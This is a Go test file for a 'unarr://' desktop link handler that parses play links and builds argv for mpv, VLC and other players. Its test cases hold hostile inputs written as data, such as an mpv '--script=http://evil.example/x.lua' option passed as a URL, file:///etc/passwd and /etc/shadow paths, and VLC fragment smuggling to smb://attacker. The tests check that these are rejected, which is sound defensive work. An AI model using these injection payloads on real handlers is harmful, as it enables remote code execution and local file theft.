package main

import (
	"fmt"
	"net/url"
	"reflect"
	"strings"
	"testing"
)

func TestOpenArg(t *testing.T) {
	tests := []struct {
		name   string
		args   []string
		want   string
		wantOK bool
	}{
		{"open flag with url", []string{"--open", "unarr://play?url=x"}, "unarr://play?url=x", true},
		{"open flag equals form", []string{"--open=unarr://play?url=x"}, "unarr://play?url=x", true},
		{"bare scheme arg (%u/%1 substitution)", []string{"unarr://play?url=x"}, "unarr://play?url=x", true},
		{"bare scheme arg uppercase", []string{"UNARR://play?url=x"}, "UNARR://play?url=x", true},
		{"open flag without url still claims the mode", []string{"--open"}, "", true},
		{"no args -> tray mode", nil, "", false},
		{"unrelated flag -> tray mode", []string{"--verbose"}, "", false},
		{"scheme arg with extra args -> tray mode", []string{"unarr://play?url=x", "other"}, "", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, ok := openArg(tt.args)
			if got != tt.want || ok != tt.wantOK {
				t.Errorf("openArg(%v) = (%q, %v), want (%q, %v)", tt.args, got, ok, tt.want, tt.wantOK)
			}
		})
	}
}

// link builds an unarr://play link with the given query params, encoding the
// same way the web does (url.Values), so tests read as intent, not escapes.
func link(params map[string]string) string {
	q := url.Values{}
	for k, v := range params {
		q.Set(k, v)
	}
	return "unarr://play?" + q.Encode()
}

// linkWithSubs builds a link carrying REPEATED sub= params (url.Values.Add,
// which is exactly what the web emits) — the map-based `link` helper above can
// only express one value per key.
func linkWithSubs(streamURL string, subs ...string) string {
	q := url.Values{}
	q.Set("url", streamURL)
	for _, s := range subs {
		q.Add("sub", s)
	}
	return "unarr://play?" + q.Encode()
}

func TestParsePlayURL(t *testing.T) {
	tests := []struct {
		name    string
		raw     string
		want    playRequest
		wantErr string // substring of the expected error; "" = no error
	}{
		{
			name: "full happy path",
			raw: link(map[string]string{
				"url":   "https://cdn.example.com/v.mkv?token=abc",
				"start": "90",
				"title": "My Show S01E02",
				"alang": "es,en",
				"slang": "es",
			}),
			want: playRequest{
				URL:   "https://cdn.example.com/v.mkv?token=abc",
				Start: 90,
				Title: "My Show S01E02",
				ALang: []string{"es", "en"},
				SLang: []string{"es"},
			},
		},
		{
			name: "plain http allowed",
			raw:  link(map[string]string{"url": "http://192.168.1.10:11818/stream/x.mkv"}),
			want: playRequest{URL: "http://192.168.1.10:11818/stream/x.mkv"},
		},
		{
			name:    "file scheme rejected",
			raw:     link(map[string]string{"url": "file:///etc/passwd"}),
			wantErr: "must be http(s)",
		},
		{
			name:    "javascript scheme rejected",
			raw:     link(map[string]string{"url": "javascript:alert(1)"}),
			wantErr: "must be http(s)",
		},
		{
			name:    "data scheme rejected",
			raw:     link(map[string]string{"url": "data:text/html,hi"}),
			wantErr: "must be http(s)",
		},
		{
			// The mpv-handler RCE shape: an option smuggled as the "URL".
			// url.Parse chokes on it ("first path segment cannot contain
			// colon") before the scheme whitelist even runs — either way it
			// must never reach player argv.
			name:    "url that is an mpv option rejected",
			raw:     link(map[string]string{"url": "--script=http://evil.example/x.lua"}),
			wantErr: "unparseable stream url",
		},
		{
			// Same shape without a colon parses as a relative URL with no
			// scheme, so this one exercises the whitelist branch.
			name:    "colonless option-shaped url rejected by whitelist",
			raw:     link(map[string]string{"url": "--fs"}),
			wantErr: "must be http(s)",
		},
		{
			name:    "scheme-relative url rejected",
			raw:     link(map[string]string{"url": "//evil.example/x"}),
			wantErr: "must be http(s)",
		},
		{
			name:    "unparseable stream url rejected",
			raw:     link(map[string]string{"url": "http://exa mple.com/v.mkv"}),
			wantErr: "unparseable stream url",
		},
		{
			name:    "http url without host rejected",
			raw:     link(map[string]string{"url": "http:///path-only"}),
			wantErr: "no host",
		},
		{
			name:    "missing url param",
			raw:     "unarr://play?start=5",
			wantErr: "missing url=",
		},
		{
			name:    "wrong action host rejected",
			raw:     "unarr://config?url=https%3A%2F%2Fx.example%2Fv",
			wantErr: "unsupported action",
		},
		{
			name:    "wrong outer scheme rejected",
			raw:     "mpv://play?url=https%3A%2F%2Fx.example%2Fv",
			wantErr: "unexpected scheme",
		},
		{
			name: "non-numeric start dropped, not fatal",
			raw:  link(map[string]string{"url": "https://x.example/v", "start": "12abc"}),
			want: playRequest{URL: "https://x.example/v"},
		},
		{
			name: "negative start dropped",
			raw:  link(map[string]string{"url": "https://x.example/v", "start": "-5"}),
			want: playRequest{URL: "https://x.example/v"},
		},
		{
			// A flag smuggled into the language list must be dropped, never
			// forwarded — it would otherwise land inside --alang=... argv.
			name: "alang injection tokens dropped",
			raw:  link(map[string]string{"url": "https://x.example/v", "alang": "es,--script=x,en,zz9!,pt-BR"}),
			want: playRequest{URL: "https://x.example/v", ALang: []string{"es", "en", "pt-BR"}},
		},
		{
			name: "slang all invalid -> empty",
			raw:  link(map[string]string{"url": "https://x.example/v", "slang": "--osd-on,1234"}),
			want: playRequest{URL: "https://x.example/v"},
		},
		{
			name: "title control chars stripped",
			raw:  link(map[string]string{"url": "https://x.example/v", "title": "My\x00 Sh\x1bow\n"}),
			want: playRequest{URL: "https://x.example/v", Title: "My Show"},
		},
		{
			name: "overlong title capped",
			raw:  link(map[string]string{"url": "https://x.example/v", "title": strings.Repeat("a", 500)}),
			want: playRequest{URL: "https://x.example/v", Title: strings.Repeat("a", 200)},
		},
		{
			// A raw control character makes url.Parse itself fail (malformed
			// %-escapes in the query would NOT — ParseQuery drops those pairs,
			// which surfaces as "missing url=" instead).
			name:    "unparseable outer link",
			raw:     "unarr://play\x00?url=https://x.example/v",
			wantErr: "unparseable link",
		},
		{
			name: "repeated sub params collected in order",
			raw: linkWithSubs("https://x.example/v",
				"https://unarr.app/api/internal/subtitles/proxy?token=a",
				"https://unarr.app/api/internal/subtitles/proxy?token=b",
			),
			want: playRequest{
				URL: "https://x.example/v",
				SubFiles: []string{
					"https://unarr.app/api/internal/subtitles/proxy?token=a",
					"https://unarr.app/api/internal/subtitles/proxy?token=b",
				},
			},
		},
		{
			name: "no sub params -> nil",
			raw:  link(map[string]string{"url": "https://x.example/v"}),
			want: playRequest{URL: "https://x.example/v"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := parsePlayURL(tt.raw)
			if tt.wantErr != "" {
				if err == nil {
					t.Fatalf("parsePlayURL(%q) = %+v, want error containing %q", tt.raw, got, tt.wantErr)
				}
				if !strings.Contains(err.Error(), tt.wantErr) {
					t.Fatalf("parsePlayURL(%q) error = %q, want it to contain %q", tt.raw, err, tt.wantErr)
				}
				return
			}
			if err != nil {
				t.Fatalf("parsePlayURL(%q) unexpected error: %v", tt.raw, err)
			}
			if !reflect.DeepEqual(got, tt.want) {
				t.Errorf("parsePlayURL(%q) = %+v, want %+v", tt.raw, got, tt.want)
			}
		})
	}
}

// TestParsePlayURLSubFiles pins the `sub=` contract: the SAME http(s) whitelist
// as the stream url (a media player must never be pointed at a local file by a
// web page), invalid entries DROPPED rather than fatal (subtitles are an
// enhancement — one bad link must not stop the movie), and a hard cap so a
// hostile page can't inflate argv until the spawn fails.
func TestParsePlayURLSubFiles(t *testing.T) {
	const stream = "https://x.example/v.mkv"

	tests := []struct {
		name string
		subs []string
		want []string
	}{
		{
			name: "http and https both accepted",
			subs: []string{"https://subs.example/a.vtt", "http://192.168.1.10:3030/b.vtt"},
			want: []string{"https://subs.example/a.vtt", "http://192.168.1.10:3030/b.vtt"},
		},
		{
			// The whole point of the whitelist: file:// would turn the player
			// into a local-file reader driven by any page on the internet.
			name: "file scheme dropped silently",
			subs: []string{"file:///etc/passwd", "https://subs.example/ok.vtt"},
			want: []string{"https://subs.example/ok.vtt"},
		},
		{
			name: "javascript and data schemes dropped silently",
			subs: []string{"javascript:alert(1)", "data:text/vtt,WEBVTT", "https://subs.example/ok.vtt"},
			want: []string{"https://subs.example/ok.vtt"},
		},
		{
			name: "url without host dropped",
			subs: []string{"http:///only-a-path", "https://subs.example/ok.vtt"},
			want: []string{"https://subs.example/ok.vtt"},
		},
		{
			// An option smuggled as a subtitle "URL" must never reach argv.
			name: "option-shaped entry dropped",
			subs: []string{"--sub-file=/etc/shadow", "https://subs.example/ok.vtt"},
			want: []string{"https://subs.example/ok.vtt"},
		},
		{
			name: "blank entries skipped",
			subs: []string{"", "   ", "https://subs.example/ok.vtt"},
			want: []string{"https://subs.example/ok.vtt"},
		},
		{
			name: "all invalid -> nil, still not an error",
			subs: []string{"file:///a", "javascript:b"},
			want: nil,
		},
		{
			// MRL SMUGGLING: VLC chains inputs inside one --input-slave with
			// '#', and a fragment is a legal part of an https URL — so the
			// scheme whitelist alone would let `https://ok/a#file:///etc/passwd`
			// through and VLC would open the file:// half as a slave input.
			name: "fragment smuggling a file:// MRL dropped",
			subs: []string{"https://ok.example/a#file:///etc/passwd", "https://subs.example/ok.vtt"},
			want: []string{"https://subs.example/ok.vtt"},
		},
		{
			name: "fragment smuggling an smb:// MRL dropped",
			subs: []string{"https://ok.example/a#smb://attacker/share/x", "https://subs.example/ok.vtt"},
			want: []string{"https://subs.example/ok.vtt"},
		},
		{
			// Even an EMPTY fragment is refused: nothing our server mints
			// carries one, so its presence means the link was hand-built.
			name: "empty fragment dropped",
			subs: []string{"https://ok.example/a#", "https://subs.example/ok.vtt"},
			want: []string{"https://subs.example/ok.vtt"},
		},
		{
			name: "bare '#' separator between two https MRLs dropped",
			subs: []string{"https://ok.example/a#https://evil.example/b", "https://subs.example/ok.vtt"},
			want: []string{"https://subs.example/ok.vtt"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := parsePlayURL(linkWithSubs(stream, tt.subs...))
			if err != nil {
				t.Fatalf("parsePlayURL() unexpected error: %v", err)
			}
			if got.URL != stream {
				t.Errorf("stream url = %q, want %q", got.URL, stream)
			}
			if !reflect.DeepEqual(got.SubFiles, tt.want) {
				t.Errorf("SubFiles = %q, want %q", got.SubFiles, tt.want)
			}
		})
	}

	t.Run("count capped at maxSubFiles, keeping the first ones", func(t *testing.T) {
		var subs []string
		for i := 0; i < maxSubFiles+7; i++ {
			subs = append(subs, fmt.Sprintf("https://subs.example/%d.vtt", i))
		}
		got, err := parsePlayURL(linkWithSubs(stream, subs...))
		if err != nil {
			t.Fatalf("parsePlayURL() unexpected error: %v", err)
		}
		if len(got.SubFiles) != maxSubFiles {
			t.Fatalf("len(SubFiles) = %d, want %d", len(got.SubFiles), maxSubFiles)
		}
		if !reflect.DeepEqual(got.SubFiles, subs[:maxSubFiles]) {
			t.Errorf("SubFiles = %q, want the first %d entries %q", got.SubFiles, maxSubFiles, subs[:maxSubFiles])
		}
	})

	t.Run("invalid entries do not consume cap slots", func(t *testing.T) {
		subs := []string{"file:///a", "javascript:b", "https://subs.example/ok.vtt"}
		got, err := parsePlayURL(linkWithSubs(stream, subs...))
		if err != nil {
			t.Fatalf("parsePlayURL() unexpected error: %v", err)
		}
		if !reflect.DeepEqual(got.SubFiles, []string{"https://subs.example/ok.vtt"}) {
			t.Errorf("SubFiles = %q, want the single valid entry", got.SubFiles)
		}
	})
}

// TestParsePlayURLPlaylist covers the `playlist=` param: the signed sting+feature
// .m3u the web mints for unarr Desktop. Same http(s) gate as url=/web=; an
// invalid one is dropped (the feature url= still plays), never fatal.
func TestParsePlayURLPlaylist(t *testing.T) {
	const stream = "https://x.example/v.mkv"
	const m3u = "https://unarr.app/api/internal/stream/playlist.m3u?token=aaa.111.mmm"

	t.Run("valid https playlist parsed, feature url kept", func(t *testing.T) {
		got, err := parsePlayURL(link(map[string]string{"url": stream, "playlist": m3u}))
		if err != nil {
			t.Fatalf("parsePlayURL() unexpected error: %v", err)
		}
		if got.URL != stream {
			t.Errorf("URL = %q, want %q (feature must survive as fallback)", got.URL, stream)
		}
		if got.Playlist != m3u {
			t.Errorf("Playlist = %q, want %q", got.Playlist, m3u)
		}
	})

	t.Run("absent playlist -> empty, feature plays", func(t *testing.T) {
		got, err := parsePlayURL(link(map[string]string{"url": stream}))
		if err != nil {
			t.Fatalf("parsePlayURL() unexpected error: %v", err)
		}
		if got.Playlist != "" {
			t.Errorf("Playlist = %q, want empty", got.Playlist)
		}
	})

	// The whole reason for the http(s) gate: a file:// playlist would make the
	// player open a local file. Dropped silently, and the feature still plays.
	for _, bad := range []string{"file:///etc/passwd", "javascript:alert(1)", "data:text/plain,x", "http:///no-host"} {
		t.Run("invalid playlist dropped: "+bad, func(t *testing.T) {
			got, err := parsePlayURL(link(map[string]string{"url": stream, "playlist": bad}))
			if err != nil {
				t.Fatalf("parsePlayURL() unexpected error: %v", err)
			}
			if got.Playlist != "" {
				t.Errorf("Playlist = %q, want empty (invalid scheme must be dropped)", got.Playlist)
			}
			if got.URL != stream {
				t.Errorf("URL = %q, want %q (feature must still play)", got.URL, stream)
			}
		})
	}
}

// TestBuildPlayerArgvPlaylist proves the playlist becomes the media argument for
// every playlist-capable dialect, and that external sub= flags are SUPPRESSED
// when it does (the served .m3u already carries them on its feature entry, so
// re-adding them as flags would double every track). start/title/lang prefs are
// harmless and stay.
func TestBuildPlayerArgvPlaylist(t *testing.T) {
	const feature = "https://x.example/v.mkv"
	const m3u = "https://unarr.app/api/internal/stream/playlist.m3u?token=t.1.m"
	const sub = "https://subs.example/a.vtt"
	req := playRequest{URL: feature, Playlist: m3u, Start: 0, SLang: []string{"es"}, SubFiles: []string{sub}}

	cases := []struct {
		p    player
		want []string
	}{
		{
			p:    player{kind: playerMPV, bin: "mpv"},
			want: []string{"mpv", "--slang=es", "--", m3u},
		},
		{
			p:    player{kind: playerCelluloid, bin: "celluloid"},
			want: []string{"celluloid", "--mpv-slang=es", "--", m3u},
		},
		{
			p:    player{kind: playerVLC, bin: "vlc"},
			want: []string{"vlc", "--sub-language=es", "--", m3u},
		},
	}
	for _, c := range cases {
		t.Run(string(c.p.kind), func(t *testing.T) {
			got, err := buildPlayerArgv(c.p, req)
			if err != nil {
				t.Fatalf("buildPlayerArgv() error: %v", err)
			}
			if !reflect.DeepEqual(got, c.want) {
				t.Errorf("argv = %q, want %q", got, c.want)
			}
			// No external subtitle flag may appear — the playlist carries them.
			for _, tok := range got {
				if strings.Contains(tok, sub) {
					t.Errorf("argv leaked a sub flag %q — playlist must carry subs, not the flags", tok)
				}
			}
		})
	}

	t.Run("mpc-hc opens the playlist positionally", func(t *testing.T) {
		got, err := buildPlayerArgv(player{kind: playerMPC, bin: "mpc-hc64.exe"}, req)
		if err != nil {
			t.Fatalf("buildPlayerArgv() error: %v", err)
		}
		want := []string{"mpc-hc64.exe", m3u}
		if !reflect.DeepEqual(got, want) {
			t.Errorf("argv = %q, want %q", got, want)
		}
	})
}

// TestParsePlayURLIgnoresUnknownParams is the OLD-BINARY compatibility proof.
// The parser reads only the params it knows (q.Get / q["sub"]), so a link from
// a NEWER web carrying parameters this build has never heard of still plays —
// the unknown ones are ignored, not rejected. That is what lets the web emit
// `sub=` unconditionally: the scheme launch is fire-and-forget, so it can never
// discover which handler version is installed.
func TestParsePlayURLIgnoresUnknownParams(t *testing.T) {
	raw := link(map[string]string{
		"url":           "https://x.example/v.mkv",
		"start":         "42",
		"futureFeature": "whatever",
		"sub2":          "https://subs.example/a.vtt",
	})
	got, err := parsePlayURL(raw)
	if err != nil {
		t.Fatalf("parsePlayURL() unexpected error: %v", err)
	}
	want := playRequest{URL: "https://x.example/v.mkv", Start: 42}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("parsePlayURL() = %+v, want %+v", got, want)
	}
}

// TestBuildPlayerArgvWithoutSubFilesUnchanged is the other half of that proof,
// from the argv side: a request with no SubFiles must produce EXACTLY the argv
// the pre-subtitle builds produced. If side-loading ever leaked an empty flag
// into the command line, every existing launch would change shape.
func TestBuildPlayerArgvWithoutSubFilesUnchanged(t *testing.T) {
	req := playRequest{URL: "https://x.example/v.mkv", Start: 90, SLang: []string{"es"}}
	cases := []struct {
		p    player
		want []string
	}{
		{
			p:    player{kind: playerMPV, bin: "mpv"},
			want: []string{"mpv", "--start=90", "--slang=es", "--", req.URL},
		},
		{
			p:    player{kind: playerVLC, bin: "vlc"},
			want: []string{"vlc", "--start-time=90", "--sub-language=es", "--", req.URL},
		},
		{
			p:    player{kind: playerCelluloid, bin: "celluloid"},
			want: []string{"celluloid", "--mpv-start=90", "--mpv-slang=es", "--", req.URL},
		},
	}
	for _, c := range cases {
		got, err := buildPlayerArgv(c.p, req)
		if err != nil {
			t.Fatalf("%s: %v", c.p.kind, err)
		}
		if !reflect.DeepEqual(got, c.want) {
			t.Errorf("%s argv = %q, want %q", c.p.kind, got, c.want)
		}
	}
}
